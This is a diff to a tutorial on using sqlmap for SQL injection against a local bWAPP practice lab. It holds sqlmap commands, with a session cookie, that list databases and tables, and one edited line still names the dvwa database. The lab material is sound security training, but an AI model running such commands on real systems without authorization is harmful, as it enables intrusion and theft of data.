@@ -225,7 +225,7 @@ sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=
 ```
 
 -   -u: The target URL.
--   --cookie: Your DVWA session cookie (replace PHPSESSID=your-session-id with your actual session ID).
+-   --cookie: bWAPP session cookie (replace PHPSESSID=your-session-id with your actual session ID).
 -   --dbs: Tells sqlmap to retrieve the available databases.
 
 ![alt text](/img/run1.png)
@@ -244,7 +244,7 @@ To get tables in the database named `bWAPP`, we use
 sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=vgkv5rm51fhe6e2qo9qvhc8251; security_level=0" -D bWAPP --tables
 ```
 
--   -D dvwa: Specifies the dvwa database.
+-   -D bWAPP: Specifies the dvwa database.
 -   --tables: Lists all tables in the specified database.
 
 ![alt text](/img/tables.png)
